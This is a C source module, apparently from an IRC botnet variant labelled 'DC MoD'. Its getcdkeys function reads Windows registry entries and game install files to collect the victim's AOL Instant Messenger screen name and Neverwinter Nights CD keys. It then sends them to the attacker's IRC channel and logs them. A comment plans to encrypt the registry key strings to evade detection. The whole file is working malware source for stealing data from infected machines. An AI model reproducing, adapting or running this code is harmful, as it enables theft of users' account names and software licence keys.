/*
DC MoD

*/



#include "../../headers/includes.h"
#include "../../headers/functions.h"
#include "../../headers/externs.h"

// FIX ME: Encrypt registry keys
#ifndef NO_CDKEYS

//globals
REGKEYS regkeys[]={

{HKEY_CURRENT_USER,"Software\\America Online\\AOL Instant Messenger (TM)\\CurrentVersion\\Login","Screen Name","Aim Screen Name",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\BioWare\\NWN\\Neverwinter","Location","Neverwinter Nights","nwncdkey.ini","Key1="},
	{HKEY_LOCAL_MACHINE,"Software\\BioWare\\NWN\\Neverwinter","Location","Neverwinter Nights (Shadows of Undrentide)","nwncdkey.ini","Key2="},
	{HKEY_LOCAL_MACHINE,"Software\\BioWare\\NWN\\Neverwinter","Location","Neverwinter Nights (Hordes of the Underdark)","nwncdkey.ini","Key3="},
	{NULL,NULL,NULL,NULL,NULL,NULL}
};

void getcdkeys(SOCKET sock, char *chan, BOOL notice)
{
	char sendbuf[IRCLINE], line[100], szPath[MAX_PATH];
	unsigned char szDataBuf[128];

	FILE *fp;
	HKEY hkey;
	LONG lRet;
	DWORD dwSize = 128;

	for (unsigned int i=0; regkeys[i].subkey; i++) {
		lRet = fRegOpenKeyEx(regkeys[i].hkey, regkeys[i].subkey, 0, KEY_READ, &hkey);
		if(fRegQueryValueEx(hkey, regkeys[i].value, NULL, NULL, szDataBuf, &dwSize) == ERROR_SUCCESS) {
			if (regkeys[i].file) {
				sprintf(szPath, "%s\\%s", szDataBuf, regkeys[i].file);
				if((fp=fopen(szPath,"r"))!=NULL) {
					while(fgets(line,sizeof(line),fp)) {
						if(!strstr(line, regkeys[i].tag)) {
							if (strchr(regkeys[i].tag,'=')) {
								strtok(line,"=");
								sprintf(sendbuf, "4<<12%s CD Key: (%s).4>> ",regkeys[i].name,strtok(NULL, "="));
							} else
								sprintf(sendbuf, "4<<12%s CD Key: (%s).4>> ",regkeys[i].name,line);
							irc_privmsg(sock,chan,sendbuf,notice);
							addlog(sendbuf);
							break;
						}
					}
					fclose(fp);
				}
			} else {
				sprintf(sendbuf, "4<<12%s CD Key: (%s).4>> ",regkeys[i].name,szDataBuf);
				irc_privmsg(sock,chan,sendbuf,notice);
				addlog(sendbuf);
			}
		}
		fRegCloseKey(hkey);
	}

	return;
}
#endif
